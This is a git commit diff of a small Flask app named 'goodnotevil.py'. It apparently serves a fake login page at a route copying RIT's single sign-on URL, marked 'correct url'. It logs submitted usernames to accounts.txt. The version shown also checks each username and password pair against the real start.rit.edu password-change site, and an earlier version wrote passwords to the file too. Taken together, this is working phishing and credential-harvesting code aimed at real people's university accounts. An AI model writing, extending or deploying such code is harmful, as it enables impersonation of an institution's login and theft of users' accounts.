ca567d18bf626e21bceb83cea007f024632ceaeb
Tyler Krupicka <tylerkrupicka@gmail.com>
2016-10-20 22:51:52 -0400

    client side password validation and redirection

--- goodnotevil.py
+++ goodnotevil.py
@@ -1,20 +1,24 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, abort
+import requests
 app = Flask(__name__)
 
-@app.route("/login",methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
+@app.route("/test")
+def test_password():
+    username = request.args.get('username')
+    password = request.args.get('password')
     with open("accounts.txt", "a") as myfile:
-        myfile.write(username + " " + password + "\n")
+        myfile.write(username + " " + "password" + "\n")
     s = "https://"+username+":"+password+"@start.rit.edu/ChangePassword/"
-    print(s)
-    return redirect(s, code=302)
+    r = requests.get(s)
+    print(r.status_code)
+    if r.status_code == 200:
+        return "True"
+    else:
+        abort(400)
 
 @app.route("/idp/profile/SAML2/Redirect/SSO") #correct url
 def form():
     return render_template('index.html')
-
 
 @app.route("/")
 def index():
